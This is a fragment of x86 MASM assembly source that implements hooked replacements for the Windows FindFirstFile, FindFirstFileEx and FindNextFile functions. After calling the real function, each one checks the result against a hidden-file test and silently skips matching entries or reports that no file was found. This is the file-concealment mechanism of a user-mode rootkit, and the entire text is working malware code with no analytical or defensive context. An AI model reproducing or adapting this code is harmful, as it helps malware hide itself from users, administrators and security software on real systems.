
.code

;; -------------------------------------------------------------------------------- ;;
NewFindFirstFileEx proc p1:dword, p2:dword, p3:dword, p4:dword, p5:dword, p6:dword

	push p6		; dwAdditionalFlags
	push p5		; lpSearchFilter
	push p4		; fSearchOp
	push p3		; lpFindFileData
	push p2		; fInfoLevelId
	push p1		; lpFileName
	call eax	; Real FindFirstFileEx
	.if eax==INVALID_HANDLE_VALUE
		ret
	.endif

	pushad

; Decision: to hide or not to hide
	mov ebx, p3
	add ebx, 44	; FileName offset in WIN32_FIND_DATA struc
	call IsHiddenFile
	.if ebx==0
		popad
		ret
	.endif

; Hide file (replace by next)
	invoke FindNextFileW, eax, p3
	.if eax!=0
		popad
		ret
	.endif

; If hidden file was last
	invoke SetLastError, ERROR_FILE_NOT_FOUND
	popad
	xor eax, eax
	ret
NewFindFirstFileEx endp


;; -------------------------------------------------------------------------------- ;;
NewFindFirstFile proc p1:dword, p2:dword

	push p2		; lpFindFileData
	push p1		; lpFileName
	call eax	; Real FindFirstFile
	.if eax==INVALID_HANDLE_VALUE
		ret
	.endif

	pushad

; Decision: to hide or not to hide
	mov ebx, p2
	add ebx, 44	; FileName offset in WIN32_FIND_DATA struc
	call IsHiddenFile
	.if ebx==0
		popad
		ret
	.endif

; Hide file (replace by next)
	invoke FindNextFileW, eax, p2
	.if eax!=0
		popad
		ret
	.endif

; If hidden file was last
	invoke SetLastError, ERROR_FILE_NOT_FOUND
	popad
	xor eax, eax
	ret
NewFindFirstFile endp


;; -------------------------------------------------------------------------------- ;;
NewFindNextFile proc p1:dword, p2:dword
	local RealFindNextFile : dword

	mov RealFindNextFile, eax

@FindNextFile:
	push p2					; lpFindFileData
	push p1					; hFindFile
	call RealFindNextFile	; Real FindNextFile
	.if eax==0
		ret
	.endif

	pushad

; Decision: to hide or not to hide
	mov ebx, p2
	add ebx, 44	; FileName offset in WIN32_FIND_DATA struc
	call IsHiddenFile
	.if ebx==0
		popad
		ret
	.endif

; Hide file (replace by next)
	popad
	jmp @FindNextFile
NewFindNextFile endp

